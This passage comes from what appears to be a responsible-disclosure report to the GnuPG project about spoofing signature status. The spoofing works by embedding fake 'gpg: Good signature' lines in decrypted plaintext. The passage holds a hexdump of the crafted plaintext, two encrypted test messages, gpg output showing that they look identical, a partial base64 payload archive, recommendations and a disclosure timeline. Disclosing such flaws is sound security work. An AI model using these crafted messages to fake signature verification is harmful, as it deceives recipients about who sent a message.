span style=3D"color:#FFA657">re</span><span style=3D"color:#A5D6FF"> made</=
span><span style=3D"color:#A5D6FF"> Thu</span><span style=3D"color:#79C0FF"=
> 28</span><span style=3D"color:#A5D6FF"> A</span><span style=3D"color:#FF7=
B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000020</span><span sty=
le=3D"color:#79C0FF">  75</span><span style=3D"color:#79C0FF"> 67</span><sp=
an style=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 32</spa=
n><span style=3D"color:#79C0FF"> 30</span><span style=3D"color:#79C0FF"> 32=
</span><span style=3D"color:#79C0FF"> 35</span><span style=3D"color:#79C0FF=
"> 20</span><span style=3D"color:#79C0FF">  30</span><span style=3D"color:#=
79C0FF"> 32</span><span style=3D"color:#A5D6FF"> 3a</span><span style=3D"co=
lor:#79C0FF"> 34</span><span style=3D"color:#79C0FF"> 30</span><span style=
=3D"color:#A5D6FF"> 3a</span><span style=3D"color:#79C0FF"> 33</span><span =
style=3D"color:#79C0FF"> 32</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">ug</span><span style=3D"color:#79C0FF"> 2025</=
span><span style=3D"color:#A5D6FF"> 02:40:32</span><span style=3D"color:#FF=
7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000030</span><span sty=
le=3D"color:#79C0FF">  20</span><span style=3D"color:#79C0FF"> 50</span><sp=
an style=3D"color:#A5D6FF"> 4d</span><span style=3D"color:#79C0FF"> 20</spa=
n><span style=3D"color:#79C0FF"> 43</span><span style=3D"color:#79C0FF"> 45=
</span><span style=3D"color:#79C0FF"> 53</span><span style=3D"color:#79C0FF=
"> 54</span><span style=3D"color:#A5D6FF">  0a</span><span style=3D"color:#=
79C0FF"> 67</span><span style=3D"color:#79C0FF"> 70</span><span style=3D"co=
lor:#79C0FF"> 67</span><span style=3D"color:#A5D6FF"> 3a</span><span style=
=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 20</span><span =
style=3D"color:#79C0FF"> 20</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657"> PM</span><span style=3D"color:#A5D6FF"> CEST.=
gpg:</span><span style=3D"color:#FF7B72">   |</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000040</span><span sty=
le=3D"color:#79C0FF">  20</span><span style=3D"color:#79C0FF"> 20</span><sp=
an style=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 20</spa=
n><span style=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 20=
</span><span style=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF=
"> 20</span><span style=3D"color:#79C0FF">  20</span><span style=3D"color:#=
79C0FF"> 20</span><span style=3D"color:#79C0FF"> 20</span><span style=3D"co=
lor:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 20</span><span style=
=3D"color:#79C0FF"> 75</span><span style=3D"color:#79C0FF"> 73</span><span =
style=3D"color:#79C0FF"> 69</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">             usi</span><span style=3D"color:#F=
F7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000050</span><span sty=
le=3D"color:#A5D6FF">  6e</span><span style=3D"color:#79C0FF"> 67</span><sp=
an style=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 52</spa=
n><span style=3D"color:#79C0FF"> 53</span><span style=3D"color:#79C0FF"> 41=
</span><span style=3D"color:#79C0FF"> 20</span><span style=3D"color:#A5D6FF=
"> 6b</span><span style=3D"color:#79C0FF">  65</span><span style=3D"color:#=
79C0FF"> 79</span><span style=3D"color:#79C0FF"> 20</span><span style=3D"co=
lor:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span style=
=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span =
style=3D"color:#79C0FF"> 41</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">ng</span><span style=3D"color:#A5D6FF"> RSA</s=
pan><span style=3D"color:#A5D6FF"> key</span><span style=3D"color:#A5D6FF">=
 AAAAA</span><span style=3D"color:#FF7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000060</span><span sty=
le=3D"color:#79C0FF">  41</span><span style=3D"color:#79C0FF"> 41</span><sp=
an style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</spa=
n><span style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41=
</span><span style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF=
"> 41</span><span style=3D"color:#79C0FF">  41</span><span style=3D"color:#=
79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span style=3D"co=
lor:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span style=
=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span =
style=3D"color:#79C0FF"> 41</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">AAAAAAAAAAAAAAAA</span><span style=3D"color:#F=
F7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000070</span><span sty=
le=3D"color:#79C0FF">  41</span><span style=3D"color:#79C0FF"> 41</span><sp=
an style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</spa=
n><span style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41=
</span><span style=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF=
"> 41</span><span style=3D"color:#79C0FF">  41</span><span style=3D"color:#=
79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span style=3D"co=
lor:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span style=
=3D"color:#79C0FF"> 41</span><span style=3D"color:#79C0FF"> 41</span><span =
style=3D"color:#79C0FF"> 41</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">AAAAAAAAAAAAAAAA</span><span style=3D"color:#F=
F7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000080</span><span sty=
le=3D"color:#79C0FF">  41</span><span style=3D"color:#79C0FF"> 41</span><sp=
an style=3D"color:#79C0FF"> 41</span><span style=3D"color:#A5D6FF"> 0a</spa=
n><span style=3D"color:#79C0FF"> 67</span><span style=3D"color:#79C0FF"> 70=
</span><span style=3D"color:#79C0FF"> 67</span><span style=3D"color:#A5D6FF=
"> 3a</span><span style=3D"color:#79C0FF">  20</span><span style=3D"color:#=
79C0FF"> 47</span><span style=3D"color:#A5D6FF"> 6f</span><span style=3D"co=
lor:#A5D6FF"> 6f</span><span style=3D"color:#79C0FF"> 64</span><span style=
=3D"color:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 73</span><span =
style=3D"color:#79C0FF"> 69</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">AAA.gpg:</span><span style=3D"color:#A5D6FF"> =
Good</span><span style=3D"color:#A5D6FF"> si</span><span style=3D"color:#FF=
7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000090</span><span sty=
le=3D"color:#79C0FF">  67</span><span style=3D"color:#A5D6FF"> 6e</span><sp=
an style=3D"color:#79C0FF"> 61</span><span style=3D"color:#79C0FF"> 74</spa=
n><span style=3D"color:#79C0FF"> 75</span><span style=3D"color:#79C0FF"> 72=
</span><span style=3D"color:#79C0FF"> 65</span><span style=3D"color:#79C0FF=
"> 20</span><span style=3D"color:#79C0FF">  66</span><span style=3D"color:#=
79C0FF"> 72</span><span style=3D"color:#A5D6FF"> 6f</span><span style=3D"co=
lor:#A5D6FF"> 6d</span><span style=3D"color:#79C0FF"> 20</span><span style=
=3D"color:#79C0FF"> 22</span><span style=3D"color:#79C0FF"> 41</span><span =
style=3D"color:#79C0FF"> 41</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">gnature</span><span style=3D"color:#A5D6FF"> f=
rom</span><span style=3D"color:#A5D6FF"> "AA|</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">000000a0  41 41 41 41 41=
 41 20 3c  41 41 41 41 40 41 41 41  |AAAAAA &#x3C;AAAA@AAA|</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">000000b0  41 41 2e 63 6f=
 6d 3e 22  20 5b 75 6c 74 69 6d 61  |AA.com>"</span><span style=3D"color:#E=
6EDF3"> [ultima</span><span style=3D"color:#FF7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">000000c0</span><span sty=
le=3D"color:#79C0FF">  74</span><span style=3D"color:#79C0FF"> 65</span><sp=
an style=3D"color:#A5D6FF"> 5d</span><span style=3D"color:#A5D6FF"> 0a</spa=
n><span style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00=
</span><span style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF=
"> 00</span><span style=3D"color:#79C0FF">  00</span><span style=3D"color:#=
79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span style=3D"co=
lor:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span style=
=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span =
style=3D"color:#79C0FF"> 00</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">te].............</span><span style=3D"color:#F=
F7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">000000d0</span><span sty=
le=3D"color:#79C0FF">  00</span><span style=3D"color:#79C0FF"> 00</span><sp=
an style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</spa=
n><span style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00=
</span><span style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF=
"> 00</span><span style=3D"color:#79C0FF">  00</span><span style=3D"color:#=
79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span style=3D"co=
lor:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span style=
=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</span><span =
style=3D"color:#79C0FF"> 00</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#79C0FF">................</span><span style=3D"color:#F=
F7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">*</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000250</span><span sty=
le=3D"color:#79C0FF">  00</span><span style=3D"color:#79C0FF"> 00</span><sp=
an style=3D"color:#79C0FF"> 00</span><span style=3D"color:#79C0FF"> 00</spa=
n><span style=3D"color:#FF7B72">                                       |</s=
pan><span style=3D"color:#79C0FF">....</span><span style=3D"color:#FF7B72">=
|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000254</span></span></=
code></pre><!----> <h2>Recommendations</h2> <ol><li>Users of <em>GnuPG</em>=
 should only trust program log output on stderr, and interpret stdout as me=
ssage content, and explicitly separate them in order to avoid confusion.</l=
i> <li><em>GnuPG</em> should support an option to verify the presence and v=
alidity of a signature without decrypting to an output file or standard out=
put.</li> <li><em>GnuPG</em> should output a warning when <code>--decrypt</=
code> did not verify any signatures.</li></ol> <hr/> <p>Finder credits: 490=
16</p> <p>Disclosure Timeline:</p> <ul><li>22.10.2025: Submission of initia=
l version of this report.</li></ul> <p>Upcoming Timeline:</p> <ul><li>24.10=
.2025: Submission of a talk for 39th Chaos Communication Congress (39C3). N=
o technical details shared.</li> <li>21.12.2025: Disclosure of this report =
on <a href=3D"https://seclists.org/fulldisclosure/" rel=3D"nofollow">https:=
//seclists.org/fulldisclosure/</a></li> <li>26-31.12.2025: If accepted by c=
ontent team, 39C3 Congress talk regarding this report</li></ul> <p>Please n=
ote: While we might be able to offer some flexibility, our plan is to adher=
e to the above stated upcoming timeline, regardless of the availability of =
patches or fixes. Please keep us updated regarding your remediation efforts=
.</p> <p>Thank you</p> <p>Best,
Liam</p> <h1>Incoherent Rambling</h1> <p>sq:</p> <!----><pre class=3D"shiki=
 github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabi=
ndex=3D"0"><code><span class=3D"line"><span>=3D=3D> a &#x3C;=3D=3D</span></=
span>
<span class=3D"line"><span>-----BEGIN PGP MESSAGE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>jA0ECQMKZOBdA934tTX+0ukB/ujuiwIdJnma3N+HyGlSBFCf=
K3oACL6ESVSaMByN</span></span>
<span class=3D"line"><span>wGGZcrFWe4lSHZcVFJKixblJK1K/jg2zzk11QUHzSlzAS2dq=
xp5OaB+2zENzjktN</span></span>
<span class=3D"line"><span>flC0DBXhHyUp2aQJKiA6waruqPvIQNLKjxAGbkiaNUF70NDz=
erEn79Ag5pUaH+GR</span></span>
<span class=3D"line"><span>/HynT1XMQsD07C01HasYaKmIMyG77UN0zeO+EAowEv874Gus=
pE9GQJF7SGdoullj</span></span>
<span class=3D"line"><span>UsZcmTSHzLXmfDrqdGANe8D/07KZtpRgnmLrMVD2DsAZWyMV=
aKrYKkAEWrOlNK/b</span></span>
<span class=3D"line"><span>19ZnQwOQK3dKOGRJaujERIl2JsBD2MCWQ6O8QcxklfLY4IyF=
kEzb8O+E7Zor044p</span></span>
<span class=3D"line"><span>o5D6Io8zk8q/T3639Gq8hqq5BO5A2G0x3mAO4JjNZ8QzmiUU=
294mPNiV3VBgR9VC</span></span>
<span class=3D"line"><span>k99k8zqrMOVkvUqbjQyT5LpR0LqZldKDsPPFOBF8cF4KleJs=
WorvnYXdEz+hvPoK</span></span>
<span class=3D"line"><span>xCtiumH0lZSyXIhwXnontfNa6GCCy+Nw0KtGMyMqT+aoodV7=
cCS+WsdZuy97vqS4</span></span>
<span class=3D"line"><span>+C9LiIHla0c+kWW5dQRD8hnC01Ty7KZX+17V13ZSudpsTEtY=
YkztltXRUvuQNC4H</span></span>
<span class=3D"line"><span>hD09MppwfmfHwZ6LD+ZOQeynBfp2a99w9KFzM7PqWK0mRFSu=
Gwm/NaezD0Wft/WE</span></span>
<span class=3D"line"><span>iIHrAzPxoId0nulrnKzfl9IGKV+2HKOdlvhVYS2HV3GYZi7f=
JT8/DC1QHzuKuXFi</span></span>
<span class=3D"line"><span>zs3Arg+LzrRRKnurmWD2Nr213weOpmGFHRkkQRP9TRt9n3u/=
s7RVYsgMHKCxKwKF</span></span>
<span class=3D"line"><span>PyvtyO4B6J/66Bihq+tCkp2s4PB+agxDvPoXnC/sa159nc4=
=3D</span></span>
<span class=3D"line"><span>=3D7Pq0</span></span>
<span class=3D"line"><span>-----END PGP MESSAGE-----</span></span>
<span class=3D"line"><span>=3D=3D> b &#x3C;=3D=3D</span></span>
<span class=3D"line"><span>-----BEGIN PGP MESSAGE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>jA0ECQMK+oXIwFtNZvv+0ukBomNWnXD9KSiJZe64IDUz+OYE=
f4qaX/WzDla6x5gb</span></span>
<span class=3D"line"><span>hzY1nh5tUzrVcVT0rpXHD0EI9eRsLFdyG7Cvdv9tSj/WVCCB=
Q7J+kRN0iEchCkgF</span></span>
<span class=3D"line"><span>gPjLCnvz09VlSbpDtzyL976NjRMk8H+G7hKUtPuk4HXZhL9Q=
ZSsufSyfkW4uMeRx</span></span>
<span class=3D"line"><span>BaxxHD2M5CKTxIfDCZR8w1S3/eMQUnHoXTRcgtQiJJBd2o16=
9WGoMgDbFbdfYeDw</span></span>
<span class=3D"line"><span>UE/gFpu2e0zEoMuVRbKOhd9ih7sZFtWE9AvkJCmO4p5pHGuI=
YbJNMWqBbPpSgO8Q</span></span>
<span class=3D"line"><span>/3QuXY2yIYgcamBsCfrBGC9+iAC35NRizZqf27itxxPjHoL7=
lA05FHyeRuOtWz/W</span></span>
<span class=3D"line"><span>2KlygdcTLXt2iT+2n1rJ+/GqmzZCT7vfml+3KwUB47t/3trk=
hxAitu2Fsbpb/uhj</span></span>
<span class=3D"line"><span>rqgE9yaEvZbLQnDDpNfAbxAZ69+Wro524D1G/tk18v9cNv4b=
0Xp1+DI9h40vAEWZ</span></span>
<span class=3D"line"><span>XLloCeFRTJ9HsAlNXCIgSvb3tEB55wqqX3pVZ2NKDGToBZ48=
n4FYw+7/2HiTfkdh</span></span>
<span class=3D"line"><span>eKgxODXShCjxC2lO75zoSfzOBuY1PQzgOmXB48JY18lQsTrz=
z6fQV6gZPntHcZeI</span></span>
<span class=3D"line"><span>3kWOwyHCHZV879fXkvyEJKOgp9S+nYFz4hUfO49kNeMsakPn=
UCJCEnZaNjhXtoqX</span></span>
<span class=3D"line"><span>W6aOMVzFQc+G1edySoZzCVV7fvuIV0mpyCXT8G9LoBeegi6D=
qY2EPLq2VJ0J6IjG</span></span>
<span class=3D"line"><span>TB1+Qum7JR4e74oTTYFxJqEHVLmziq7Ouaow5XNz5i8a3vsK=
ALPGYW8mt9/VGjPI</span></span>
<span class=3D"line"><span>KRnnO4AzwAHrhvK9OEqE6zvxyTRRSVj1M9cri+yN5cQo4bo8=
AxMY7jqa7+q8m3cn</span></span>
<span class=3D"line"><span>GFwa79KoeSZaEawXTieMo+e1LMQ1S7h/</span></span>
<span class=3D"line"><span>=3DgmHK</span></span>
<span class=3D"line"><span>-----END PGP MESSAGE-----</span></span></code></=
pre><!----> <h2>Impact</h2> <p>A normal user cannot easily verify if an enc=
rypted message has been verified correctly</p> <!----><pre class=3D"shiki g=
ithub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabind=
ex=3D"0"><code><span class=3D"line"><span>$ gpg --verify a</span></span>
<span class=3D"line"><span>gpg: verify signatures failed: Unexpected error<=
/span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>$ gpg --verify b</span></span>
<span class=3D"line"><span>gpg: verify signatures failed: Unexpected error<=
/span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>$ gpg --decrypt a</span></span>
<span class=3D"line"><span>gpg: AES256.CFB encrypted data</span></span>
<span class=3D"line"><span>gpg: encrypted with 1 passphrase</span></span>
<span class=3D"line"><span>abc</span></span>
<span class=3D"line"><span>gpg: Signature made Thu 28 Aug 2025 02:40:32 PM =
CEST</span></span>
<span class=3D"line"><span>gpg:                using RSA key D063593DBA72EA=
735B2344B7B23ADC47086BEFBA</span></span>
<span class=3D"line"><span>gpg: Good signature from "signer" [ultimate]</sp=
an></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>$ gpg --decrypt b</span></span>
<span class=3D"line"><span>gpg: AES256.CFB encrypted data</span></span>
<span class=3D"line"><span>gpg: encrypted with 1 passphrase</span></span>
<span class=3D"line"><span>abc</span></span>
<span class=3D"line"><span>gpg: Signature made Thu 28 Aug 2025 02:40:32 PM =
CEST</span></span>
<span class=3D"line"><span>gpg:                using RSA key D063593DBA72EA=
735B2344B7B23ADC47086BEFBA</span></span>
<span class=3D"line"><span>gpg: Good signature from "signer" [ultimate] </s=
pan></span></code></pre><!----> <p>Both exit with exit status 0. One of the=
m has a signature, the other has =E2=80=9Cgpg: =E2=80=9D lines in the plain=
text. (are we deadass??)</p> <p>example payload as .tar.b64:</p> <!----><pr=
e class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;col=
or:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>H4sIAAAAAAAAA+2=
Xd1RVx76AERscFQGVIipFjZqjnn362Sjq6b33Qyyn994PqICIDUtQiF2iKIoa</span></span>
<span class=3D"line"><span>S1RQg2IhahQsYNSIJRIMViwgahCeyX13vbvWXe/e9966N+8f=
v3/2nlmzZ34ze37f7K0M+/cDfASD</span></span>
<span class=3D"line"><span>Qv1+hWPRwB9l+F/Kf9xisIgwOBpAowAUFo7AhgFwAA5HhaUA=
f0JsYV63R+lKSQmzaAPGf9xO63L/</span></span>
<span class=3D"line"><span>GQH9uUz6HQKZSuek8Ki8FDZZKMRTyX/UQiAmPEAm8tlMBZeg=
wYNIlEckgwJeMwHmNXmNfrqGYbMq</span></span>
<span class=3D"line"><span>kRwoLUi1CAkUoo6JtOOJLAxZKBEq2YQgB+KnUhVqF0WqRVmE=
NIVaQmEwjQGVhcGEM2EmPSIUMsPh</span></span>
<span class=3D"line"><span>fDEtJLSE8EKExhlwoLlKAhQRInNCJrOHA9FZiACJIDPQgmIH=
Qsn/+Dge41e6vE6ej87nsJimAJ6q</span></span>
<span class=3D"line"><span>MhuVHDEFC3BIIa2LbMOCeD3aIVbSoFQBBEYL2kRwGZvvJgFY=
IgCnKd1yJdNKZwepWKyYA4S0XCgZ</span></span>
<span class=3D"line"><span>b/eTfTgsiup1O8gglc+gYIVUjd1rsZggYrdCbRUJaSGWzKoj=
uZwaKp6jxZFgAJap8DgEepuV5WJL</span></span>
<span class=3D"line"><span>SAiSG6+QBtkSJdMlZ5rxZKmLa+EwYSoIHFTY+H4un4nUMLlU=
AUPpNZEFdAuC4SaQEGyilI/h4vjq</span></span>
<span class=3D"line"><span>gNmiY8lR9CDFTA6pcB+DwirsLgCFckDsaBKGbseFzDgnTITE=
IEGqE2dwOtEELhqPoAIBpBXPRTFM</span></span>
<span class=3D"line"><span>HAWOH7IaxWIEiLLyOEYJUkLQC0AJEWIGQTMu5HSxuRKzT+xU=
mfhBEZrlEAAsp8KiYZLcPB6FS6Dg</span></span>
<span class=3D"line"><span>1BQU06JluKV2l88ml2nIIajBx7MzIQGix+i10gCLQhiU0Q1+=
mc1u8+g4SgyVSAxCOX6A6aGyg2yn</span></span>
<span class=3D"line"><span>CKq02zUSrJoohErdGoU3CGJ9TiEKAiWCLCOdZlECaqhZKkVr=
+AISzmD7+D5EwY/rKIPCsRI4UiH0</span></span>
<span class=3D"line"><span>ahxuEdkjl5tDHotHJhD7vHwOEUWDGEgAyHY4/DqrjuZXYFgk=
qILL1wZtBN3HbQGCfpBJCbGxPKeU</span></span>
<span class=3D"line"><span>CVgFFKGX6rfCOEptiARIdR6YlAz5OLoLH+IF7HQNYPNaXDZm=
SGcB6VSmBIqgMbkai88gkQsRNAmS</span></span>
<span class=3D"line"><span>KlcYsTqGCAcjEeF8WsjL9MooRkjIjcS79FBWyCUQMG1el1VK=
QnBcCDjSr+U6rFQKTWA28wU8UCTw</span></span>
<span class=3D"line"><span>gDakF+bGCiRyt55NYxIDTD+TAuEFfZ4gF0XAMGAYDMFocEI9=
RLMD4UbxCFClPkD6uNIyGxHmVsLR</span></span>
<span class=3D"line"><span>oE2NyoBkfJwPAPkjFckc0t+l578m/1X/mm7+If/M/1gA+5/+=
xyLRAOIv/gc++f/P4H/kf6xHqicG</span></span>
<span class=3D"line"><span>2QauPPSH/+Vug8EiETmxgIRhJZpALJpqFSrkUjbJioEqfQQs=
TmZU4kV+iJPlZMA9GJWV6tLROAIV</span></span>
<span class=3D"line"><span>x8EiOCRoFApvAZx4lhfQCY04vVtp1MmFfjJHIbOrDWIXRwi3=
qQNcp54IEcBVUrnRTrQpmFLQjpJg</span></span>
<span class=3D"line"><span>EXaX1A+gkRLOR+nqUTA6Sg/ncJFaEIn364UgHuE3eQCUgw5X=
cPhWVRDiJ5gcBhGJQuXwaZoAD3CF</span></span>
<span class=3D"line"><span>iDa7gc6XkIREOZYu1wM+tdRA5njINqXdI6NxxEYenuSgU8Wu=
kDcA40B8JD8bbXMSxGSFkY4QY0ly</span></span>
<span class=3D"line"><span>NEMoE0roNIdWjXJa1GqYwaFBi0VSDQnhgNllYioMr6X4bGYF=
Xo4M2CH0gJaJYArFGqKMCfW6HEGB</span></span>
<span class=3D"line"><span>Di/2g1YVQ67hEHlELA/pswBuItkuoomZKKNHC9JxHLiLr5Ni=
hAaYEqKUUENwt1OHQ2ClXJyOKcAh</span></span>
<span class=3D"line"><span>xNCgku5xO6Q2jYDmJAABgw2jMtM5RqEEYwLtLI9cGAwSQzSa=
XE0WQMQKM5doBLUkH5yP5wjZNKso</span></span>
<span class=3D"line"><span>yJOaEXSlIYTj4YliDOh3+7huEFS6hAy9x8+UOUiwkAaFDSnc=
OhgAATlsl5EPwzulGLycYlIH2Ua8</span></span>
<span class=3D"line"><span>T8PEaJheHwUBpTE1XpZNZcQrxTo9loL0CMx+PhThD+IDSA+P=
IdJAkHY/D093ynRWhhlgoBUclxKg</span></span>
<span class=3D"line"><span>Qbkco4qGo6MCCiXBCOcSKSBH4PLJLEyH00VkCXkAG+nl470c=
Gxki5wJ6ixaq9ZuVJJBP1vgUCJfY</span></span>
<span class=3D"line"><span>JAf1ApNRpRZRDR4w4FOLmDA4E6H2w1FeCo1LhdPoDJgcapOb=
0RC03Rw0GqVYiV4ZEBPdXJpASLY7</span></span>
<span class=3D"line"><span>2GgJkg7qHC4ZSspi+UkCrM7OxIYAhYmEhduhMlBt5lHdDgTo=
hrjQFilDReCqxE4ikcGRqRkOBUgg</span></span>
<span class=3D"line"><span>QAUem9bANxMUrABIolONIonQIPILvHK2B6sj2y0ewOFjYS1y=
SMgD4pmgUehikayqj+MqFBg72QwG</span></span>
<span class=3D"line"><span>AiILRax3YL00lhbQqgwgz6tX4mEomp9rJ/IRVoU/4+NZAHBQ=
gf/+LID8n/PfrA26jDb9v9Aof88/</span></span>
<span class=3D"line"><span>8T8GBcf81f8oFPJ3/8ORqE/f/38K68IH9TFUSEy9osP2vr9N=
hmWcOnpzczHmiqmULGjcMfx70bu3</span></span>
<span class=3D"line"><span>qqz8KGLFysS8gyvnDzzzRUqKAntloyROSjl/31q16WKpOIM7=
slC6IfJ92lfYe0uqcisKeE0iaFjM</span></span>
<span class=3D"line"><span>wWebNn0zXZjWFXFwx6KedQxmoWPfAO/Bc3ePT8h9VfOuq9eh=
9htt1qndk833m76KF27Y2LJNvhB4</span></span>
<span class=3D"line"><span>qCks3/Fi5ENqYfPl9cWbx04/dHb7hy1DvEPav8+fPQjxZHTO=
F5kxY6beL0DXepdt3/dT/sZpuIRc</span></span>
<span class=3D"line"><span>kprs72hANieAeddr47qs6qrW6g+oX5Jgy+YVn1g/e0HUltZF=
DcjzkTuNW9Jrx9agCj78zE5c1oFT</span></span>
<span class=3D"line"><span>bilinj2St610+C7UTkTOg23584mUrMSJxUV3CzOII0p+/tx/=
O6e8fng9uc1VuSqhO761+di5Fx3K</span></span>
<span class=3D"line"><span>G23fJkft7e69ETJtdhb5J4ghvvjULlulMIgpqPpsR732BS/m=
MberOzlt6/iGO9X3NQWIhYfiZHNO</span></span>
<span class=3D"line"><span>xc7c0zyWs3qL1e+kH3HtDJ8dE9Gc2NMnnhW+Kc6053Df7KLD=
vVXZFWhptMzOiZqF/npT74g1MBf1</span></span>
<span class=3D"line"><span>0oSSL+smjo6fNWLtgE316e5+s99m7G64uCjjwanYp2Bbak75=
iokd8b4JF2Kmr1y8ez/yM72Cc13n</span></span>
<span class=3D"line"><span>XVfasr1TOmH1uKiAsVfh5OKw3Ka6ZykjJkHKwOzxG+7t3/bg=
WOGlBF4V9klZaW5YTK+wXocS05Ep</span></span>
<span class=3D"line"><span>VqUOrkyZ6vZq7DMsRps3MFltt05bEs7pM6QXJAwXl9rnilqe=
ccz12J05mlR5ML2JGmFuO9Y3/PeN</span></span>
<span class=3D"line"><span>FJ7Uu++AyIj+4f2GQSIjBoT3iQvv3St8VK/w+JwwSGT0Xxsv=
YA/uYa4Zl6EQrU59/fBRfcK2XWrs</span></span>
<span class=3D"line"><span>3AcX6qJWDe7qt/IGPVCUjbPMaBg9ZTX2+SVB/tGhsa7W/SP8=
LePy+zTHOeSz7zXsvZ1VPoo+o63c</span></span>
<span class=3D"line"><span>U5DUOSG+qPhY+elIdU0T5ccJi7dGJ0vH1CZXhE3aeHf9DD8q=
i9SaW0ebTkdm7f3gnrxLvSptaihc</span></span>
<span class=3D"line"><span>ve037JFLEdHTosEVr9fMrxu54eV1a7J/RIG67BkTzOqe6rzX=
n6u8Qy5yok3JOdu+JLb0pEl5j+eW</span></span>
<span class=3D"line"><span>fZkUUVLzMO9cQ+sQippgvNA+6bZFqsvifSdCx2pf76BiK0c+=
yWvIGuBLKNkCSXnbx5Evbp/IWP7G</span></span>
<span class=3D"line"><span>voOdZB55Nrm8rOsx/eerk2NCm0dGPM1YYV4C3ah8dWzhsLp6=
ccOB8ft7Vd/ZlrqhYvK8Y/RRUcXf</span></span>
<span class=3D"line"><span>UNL2OcORLYuVVe++N5XX3Nm3Y/WJ3268zlh0Zs/EB/tvUy0V=
EwfU74htXNN4nXhjxvApr/XHp78n</span></span>
<span class=3D"line"><span>knruhr297FDsGqWp60U5A7t+89lo2s6vtwdGvOwoqhz9c4r/=
ueiNoDmuumxoaWzCulfzxNBE9/FX</span></span>
<span class=3D"line"><span>uAcNOMN3WTDh4gWn05+W2lM6o7Lni8IivQtTkv1nzvZ5Mtie=
m/zDV0t7oTfs3/L58Odv14cWRK1j</span></span>
<span class=3D"line"><span>XrWUxu5JA04eYVafL/3FMz/3EWNTSDP86VzEGOq5czOi1jQv=
fx4zcEXmjJs/gNbnJZmbhy8dffS/</span></span>
<span class=3D"line"><span>3PNt1kVaXih940xmMy3mUHz8gCLBrx2Xh2xfu0h/YMLFjtq5=
qqxF839bWQ39ZdyXyxiZkNXiMQFf</span></span>
<span class=3D"line"><span>p3F3uGmorWS7fHrBsODZ6fJzh8u3D3mSWDFqxqRJ4VOc3+2f=
/DBFXBndv5grqkrceWtd5MFnVZNU</span></span>
<span class=3D"line"><span>6Y/nVueXWCqOlV1OvHYBsfNA68D47ZOvDbpI2DqENijxTef5=
rT0VK6dG/Kp5frWtNmnb/AWjIsfl</span></span>
<span class=3D"line"><span>PELMxCLY94abbpGWR7XkbZJPsMScn3T8aeEYRt3VpJYPvyzo=
v3Gtpzm2mr98zpzN1wRuQ2rcptZr</span></span>
